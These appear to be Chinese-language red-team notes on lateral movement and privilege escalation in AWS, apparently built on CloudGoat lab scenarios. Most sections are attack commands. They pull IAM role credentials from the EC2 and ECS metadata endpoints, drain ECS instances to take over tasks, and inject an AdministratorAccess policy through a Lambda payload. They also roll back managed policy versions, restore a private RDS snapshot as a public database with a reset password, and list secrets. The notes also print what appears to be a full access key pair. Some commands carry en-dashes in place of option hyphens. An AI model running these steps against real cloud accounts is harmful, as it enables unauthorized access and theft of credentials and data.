# 0x03 AWS资源以及其特殊性



**根据[AWS官方文档](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html)可以知道，为了方便运行在EC2上的程序访问AWS中的其它资源，可以配置instance profile来给EC2实例绑定一个角色(role)，这样运行在实例上的所有程序都有绑定角色配置的权限。metadata请求的也就是EC2绑定角色权限的一个凭据。**

```bash
iam:PassRole

ec2:AssociateIamInstanceProfile

ec2:ReplaceIamInstanceProfileAssociation
```



**这就是AWS中资源的特殊性，是资源的同时，也是一个AWS中的一个虚拟用户。**

**除了EC2，AWS中其它服务lambda/api-getway/ECS等均可以绑定角色。**



# 0x04 横向移动思路



## 4.1 枚举资源和权限

获得一个aksk后第一件事是枚举当前用户所拥有的权限和资源，可以使用[PACU](https://github.com/RhinoSecurityLabs/pacu/)或者[ScoutSuite](https://github.com/nccgroup/ScoutSuite)等工具辅助完成



```bash
#用enumerate-iam
python3.10 enumerate-iam.py --access-key AKIAWHEOTHRFYM6CAHHG --secret-key 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

#用pacu，工具还没整明白，工具有点类似msf。
```



## 4.2 EC2 Metadata

即获取EC2实力metadata的临时凭据：

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2Master
```



不过官方为了增强Metadata安全性，推出了IMDSv2，V2版本服务请求元数据要先PUT获取Token再带token请求，在一定程度上缓解了公有云环境下SSRF的危害:

```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```





## 4.3 EC2 Userdata

在启动ec2实例时，可以设置一些userdata用于执行常见自动配置任务。userdata大概有两类：shell脚本和cloud-init指令。cloud-init指令类似shell脚本。

用户数据会在实例启动时自动执行，AWS设置它的本意是在EC2启动之前执行一些自动化的任务。用户使用不当可能造成凭据的泄露，如泄露数据库账号密码：

![image-20231026111025411](%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84AWS%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20231026111025411.png)

此外的一个持久化操作就是修改userdata并重启实例：

```bash
# 写恶意代码
aws ec2 run-instances --image-id ami-abcd1234 --count 1 --instance-type m3.medium
--key-name my-key-pair --subnet-id subnet-abcd1234 --security-group-ids sg-abcd1234 --user-data file://my_script.txt
# 重启
aws ec2 stop-instances --instance-ids i-xxxx
aws ec2 start-instances --instance-ids i-xxxx
```



## 4.4 ECS横向移动

在获取到EC2实例权限时，可以列举运行在EC2上的容器。

因为一个Task会绑定一个执行的Role，EC2也会绑定一个Role。

**横向思路1 EC2->Tasks**

控制了EC2后直接在容器内执行命令，访问task的metadata从而获取task绑定的Role的凭据：

```bash
#根据amazon docs，task的元数据端点为 169.254.170.2/v2/metadata
docker exec <container-id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```



**横向思路2 Tasks->EC2**

获取到单个容器的时候，如果容器的启动类型为EC2类型，可以尝试获取宿主机EC2的凭据：

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
```





**横向思路3 Task迁移**

集群内可能有多个EC2，满足以下条件可把别的EC2中运行的任务迁移到被控EC2实例：

1. 获取到一个EC2实例控制权
2. 有update-container-instances-state权限，可以关闭或者暂停运行其它集群内的EC2实例

关闭其它EC2实例后，由于ECS会自动调度任务，所以会把任务迁移到被控EC2，这样又可以利用横向思路1获取任务Role的凭据：

```bash
#列举集群
aws --profile privd ecs list-clusters
#列举集群内的任务
aws --profile privd ecs list-tasks --cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster --query taskArns

#查看任务
aws –profile privd ecs describe-tasks –cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster –tasks

#列举集群内实例
aws –profile privd ecs list-container-instances –cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster
#暂停ec2实例
aws –profile takeover ecs update-container-instances-state –cluster ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster –container-instances arn:aws:ecs:us-east-1:818529845881:container-instance/ecs-takeover-ecs_takeover_cgidtauurm6vyh-cluster/603439c72f5040b2834672fd312593d3 –status DRAINING
```



## 4.5 AssumeRole

可以获取某个Role权限的临时凭据，类似Windows域中的委派。

另外这个信任还是可以跨账号的:

- 同一账号下，role B的信任关系中有role A的ARN就够了
- 跨账号的场景下，role C（另一个账号的role，信任关系中要包含role A的ARN，role A也要有assume role的权限才能玩）

## 4.6 PassRole

为某个服务赋予某个IAM Role，之后这个服务就有对应Role的权限。但是特殊的是，**这个”服务”也可也是个用户，也就是说在有passRole权限的情况下，可以为某个用户增添某个Role。**



```bash
aws iam attach-user-policy --user-name xxx --policy-arn xxx
```



## 4.7 lambda提权

lambda创建的时候同样需要绑定一个Role，可以看lambda有无敏感操作的函数。



比如一个lambda函数的作用是为用户添加策略，就可以直接调用lambda函数为用户添加Administrator策略：

```bash
aws --region us-east-1 lambda invoke --function-name vulnerable_lambda_cgid0zbwsxk7ip-policy_applier_lambda1 --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": "cg-bilbo-vulnerable_lambda_cgid0zbwsxk7ip"}' out.txt
# cat the results to confirm everything is working properly
cat out.txt
```

此外lambda还可以ssrf读environ中的aksk。

## 4.8 更改托管策略版本提权

基于身份的策略是分版本的，`get-policy`获得的是当前的版本，`list-policy-versions`是列出策略的所有历史版本。

当遇到下面的条件：

- 历史版本中有更高的权限
- 当前的版本策略让目前的用户有了`setDefaultPolicyVersion`权限



就可以修改策略的版本实现提权：

```bash
aws iam set-default-policy-version –policy-arn <policy-arn> –version-id v5 –profile rollbackuser
```



## 4.9 RDS突破访问限制

突破RDS数据库设置为不允许公开访问的限制有两个思路：

1. 拿到VPC(专用网络，私网)中的机器后，通过机器直接访问数据库
2. 为不公开访问数据库创建快照，再根据快照创建一共可公开访问的数据库实例。



```bash
#创建数据库快照
aws rds create-db-snapshot –db-instance-identifier cg-rds-instance-codebuild-secrets-cgidrhg45g9k0y –db-snapshot test-shot

#查看子网subnet
aws rds describe-db-subnet-groups
#列举安全组
aws ec2 describe-security-groups
#根据快照创建新的数据库,同时要有一个开放了数据库端口的安全组，安全组从上一步获得
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier newDB1 --db-snapshot-identifier test-shot --db-subnet-group-name cloud-goat-rds-subnet-group-codebuild_secrets_cgidrhg45g9k0y --publicly-accessible --vpc-security-group-ids sg-0665d973c6ded2585

#列出rds实例
aws rds describe-db-instances
#列出可公开访问的rds的identifier
aws rds describe-db-instances --query 'DBInstances[*].PubliclyAccessible' --query 'DBInstances[*].DBInstanceIdentifier'

#修改密码
aws rds modify-db-instance –db-instance-identifier newdb1 –master-user-password P@ssw0rd123 
```

密码重置完毕后再访问就可以连接读取数据了。

## 4.10敏感信息收集

一些服务需要用户传递一些参数，一般是两种，环境变量和secretmanager。

环境变量，可以发现lambda函数的Environment中有aksk：

![img](%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84AWS%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/images1663225307607-293a0ab0-66b0-4f4d-8c39-06ad3875f614.png)

第二种即secretmanager，可以列举secretmanager：

```bash
aws secretmanager list-secrets
```







# 参考

https://lonmar.cn/2022/10/01/public-cloud-redteam-attack-surface-summary/



